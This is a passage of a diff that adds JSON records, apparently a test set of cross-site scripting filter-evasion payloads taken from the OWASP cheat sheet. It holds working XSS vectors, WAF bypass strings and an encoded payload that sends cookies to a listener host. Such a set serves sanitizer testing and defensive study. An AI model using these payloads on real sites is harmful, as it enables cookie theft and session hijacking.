+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / US-ASCII Encoding"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-meta-4869364bb0",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / META",
+    "payload_html": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / META"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-meta-meta-using-data-e5322d9316",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / META / META using Data",
+    "payload_html": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / META / META using Data"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-meta-meta-with-additional-url-parameter-4c0436f3a0",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / META / META with Additional URL Parameter",
+    "payload_html": "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / META / META with Additional URL Parameter"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-iframe-50c5024366",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / IFRAME",
+    "payload_html": "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / IFRAME"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-iframe-event-based-9bb0fa28ee",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / IFRAME Event Based",
+    "payload_html": "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / IFRAME Event Based"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-frame-4a756b49d9",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / FRAME",
+    "payload_html": "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>",
+    "payload_context": "html_outer",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / FRAME"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-table-835f35b8f0",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / TABLE",
+    "payload_html": "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / TABLE"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-table-td-d96c4bc10c",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / TABLE / TD",
+    "payload_html": "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / TABLE / TD"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-div-div-background-image-5a1e963454",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Background-image",
+    "payload_html": "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Background-image"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-div-div-background-image-with-unicode-xss-e-93cad23907",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Background-image with Unicode XSS Exploit",
+    "payload_html": "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Background-image with Unicode XSS Exploit"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-div-div-background-image-plus-extra-charact-b290ae3d13",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Background-image Plus Extra Characters",
+    "payload_html": "<DIV STYLE=\"background-image: url(\u0001javascript:alert('XSS'))\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Background-image Plus Extra Characters"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-div-div-expression-4425078a59",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Expression",
+    "payload_html": "<DIV STYLE=\"width: expression(alert('XSS'));\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / DIV / DIV Expression"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-downlevel-hidden-block-b0ae63c1b8",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Downlevel-Hidden Block",
+    "payload_html": "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Downlevel-Hidden Block"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-base-tag-742009695d",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / BASE Tag",
+    "payload_html": "<BASE HREF=\"javascript:alert('XSS');//\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / BASE Tag"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-object-tag-57e5e81da3",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / OBJECT Tag",
+    "payload_html": "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / OBJECT Tag"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-embed-svg-which-contains-xss-vector-04c4dc3e1c",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / EMBED SVG Which Contains XSS Vector",
+    "payload_html": "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / EMBED SVG Which Contains XSS Vector"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xml-data-island-with-cdata-obfuscation-bba6227b1a",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XML Data Island with CDATA Obfuscation",
+    "payload_html": "<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>\n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XML Data Island with CDATA Obfuscation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-locally-hosted-xml-with-embedded-javascript-43a1b85afb",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Locally hosted XML with embedded JavaScript that is generated using an XML data island",
+    "payload_html": "<XML SRC=\"xsstest.xml\" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Locally hosted XML with embedded JavaScript that is generated using an XML data island"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-html-time-in-xml-286e6010ab",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / HTML+TIME in XML",
+    "payload_html": "<HTML><BODY>\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\n<?import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\n</BODY></HTML>",
+    "payload_context": "html_outer",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / HTML+TIME in XML"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-assuming-you-can-only-fit-in-a-few-characte-8fcbf3abb9",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Assuming you can only fit in a few characters and it filters against .js",
+    "payload_html": "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Assuming you can only fit in a few characters and it filters against .js"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-ssi-server-side-includes-a95966add5",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / SSI (Server Side Includes)",
+    "payload_html": "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / SSI (Server Side Includes)"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-php-d2a48ddcfe",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / PHP",
+    "payload_html": "<? echo('<SCR)';\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / PHP"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-img-embedded-commands-1cf164739c",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / IMG Embedded Commands",
+    "payload_html": "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / IMG Embedded Commands"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-img-embedded-commands-img-embedded-commands-f5cc304dc3",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / IMG Embedded Commands / IMG Embedded Commands part II",
+    "payload_html": "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / IMG Embedded Commands / IMG Embedded Commands part II"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-cookie-manipulation-ac0f1528d3",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Cookie Manipulation",
+    "payload_html": "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">",
+    "payload_context": "html_head",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Cookie Manipulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-using-html-quote-encapsulation-073a58af70",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation",
+    "payload_html": "<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-using-html-quote-encapsulation-04d178247b",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation",
+    "payload_html": "<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-using-html-quote-encapsulation-ddd2c8ae6a",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation",
+    "payload_html": "<SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-using-html-quote-encapsulation-c69aed270a",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation",
+    "payload_html": "<SCRIPT \"a='>'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-using-html-quote-encapsulation-37768cc0d3",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation",
+    "payload_html": "<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-using-html-quote-encapsulation-fc443f1781",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation",
+    "payload_html": "<SCRIPT a=\">'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-xss-using-html-quote-encapsulation-2c1d2b13fb",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation",
+    "payload_html": "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / XSS Using HTML Quote Encapsulation"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-ip-versus-hostname-5d0e7b99a8",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / IP Versus Hostname",
+    "payload_html": "<A HREF=\"http://66.102.7.147/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / IP Versus Hostname"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-url-encoding-d33763bf7c",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / URL Encoding",
+    "payload_html": "<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / URL Encoding"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-dword-encoding-6c1a71f321",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / DWORD Encoding",
+    "payload_html": "<A HREF=\"http://1113982867/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / DWORD Encoding"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-hex-encoding-3fb04d90c4",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Hex Encoding",
+    "payload_html": "<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Hex Encoding"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-octal-encoding-2e3d682ea9",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Octal Encoding",
+    "payload_html": "<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Octal Encoding"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-base64-encoding-cd99030b22",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Base64 Encoding",
+    "payload_html": "<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Base64 Encoding"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-mixed-encoding-a5b03d7e25",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Mixed Encoding",
+    "payload_html": "<A HREF=\"h\ntt  p://6   6.000146.0x7.147/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Mixed Encoding"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-protocol-resolution-bypa-a4fbe879b4",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Protocol Resolution Bypass",
+    "payload_html": "<A HREF=\"//www.google.com/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Protocol Resolution Bypass"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-removing-cnames-eeaa749db8",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Removing CNAMEs",
+    "payload_html": "<A HREF=\"http://google.com/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Removing CNAMEs"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-removing-cnames-69c041ec1e",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Removing CNAMEs",
+    "payload_html": "<A HREF=\"http://www.google.com./\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Removing CNAMEs"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-javascript-link-location-6e08c6293f",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / JavaScript Link Location",
+    "payload_html": "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / JavaScript Link Location"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-url-string-evasion-content-replace-as-attac-653298a583",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Content Replace as Attack Vector",
+    "payload_html": "<A HREF=\"http://www.google.com/ogle.com/\">XSS</A>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / URL String Evasion / Content Replace as Attack Vector"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-assisting-xss-with-http-parameter-pollution-dd4d730e19",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Content Page Source Code",
+    "payload_html": "a href=\"/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>\">Share</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Content Page Source Code"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-assisting-xss-with-http-parameter-pollution-b4428fc5d2",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Share Page Source Code",
+    "payload_html": "<script>\nvar contentType = <%=Request.getParameter(\"content_type\")%>;\nvar title = \"<%=Encode.forJavaScript(request.getParameter(\"title\"))%>\";\n...\n//some user agreement and sending to server logic might be here\n...\n</script>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Share Page Source Code"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-assisting-xss-with-http-parameter-pollution-6515543ff2",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Content Page Output",
+    "payload_html": "<a href=\"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\">Share</a>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Content Page Output"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-tests-assisting-xss-with-http-parameter-pollution-17487aea0c",
+    "description": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Share Page Output",
+    "payload_html": "<script>\nvar contentType = 1; alert(1);\nvar title = \"This is a regular title\";\n…\n//some user agreement and sending to server logic might be here\n…\n</script>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Tests / Assisting XSS with HTTP Parameter Pollution / Share Page Output"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-21d132268d",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / Reflected XSS in JavaScript",
+    "payload_html": "<script> ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... </script>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / Reflected XSS in JavaScript"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-b96ef89440",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / Reflected XSS in JavaScript",
+    "payload_html": "/?xss=500); alert(document.cookie);//",
+    "payload_context": "js",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+    "source_section": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / Reflected XSS in JavaScript"
+  },
+  {
+    "id": "owasp-xss-filter-evasion-cheat-sheet-methods-to-bypass-waf-cross-site-scripting-genera-1bb8d36f83",
+    "description": "XSS Filter Evasion Cheat Sheet / Methods to Bypass WAF – Cross-Site Scripting / General issues / DOM-based XSS",
+    "payload_html": "<script> ... eval($\\_GET\\[xss\\]); ... </script>",
+    "payload_context": "html",
+    "source_url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
